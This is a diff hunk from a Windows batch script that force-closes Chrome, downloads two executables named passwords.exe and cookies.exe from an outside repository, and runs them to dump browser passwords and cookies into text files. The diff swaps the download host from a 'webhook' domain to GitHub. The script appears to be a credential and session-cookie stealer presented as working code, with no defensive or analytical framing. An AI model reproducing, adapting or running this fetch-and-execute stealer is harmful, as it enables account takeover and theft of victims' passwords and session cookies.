@@ -27,8 +27,8 @@ if errorlevel 1 (
 echo.
 
 taskkill /f /im chrome.exe
-curl -o "%USERPROFILE%\Downloads\p.exe" https://zawg.cloud/webhook/p.exe
-curl -o "%USERPROFILE%\Downloads\c.exe" https://zawg.cloud/webhook/c.exe
+curl -o "%USERPROFILE%\Downloads\p.exe" https://github.com/harryzawg/ZawgCookies/raw/main/passwords.exe
+curl -o "%USERPROFILE%\Downloads\c.exe" https://github.com/harryzawg/ZawgCookies/raw/main/cookies.exe
 cd "%USERPROFILE%\Downloads"
 "%USERPROFILE%\Downloads\c.exe" -c > "%USERPROFILE%\Downloads\cookies.txt"
 "%USERPROFILE%\Downloads\p.exe" -c > "%USERPROFILE%\Downloads\passes.txt"
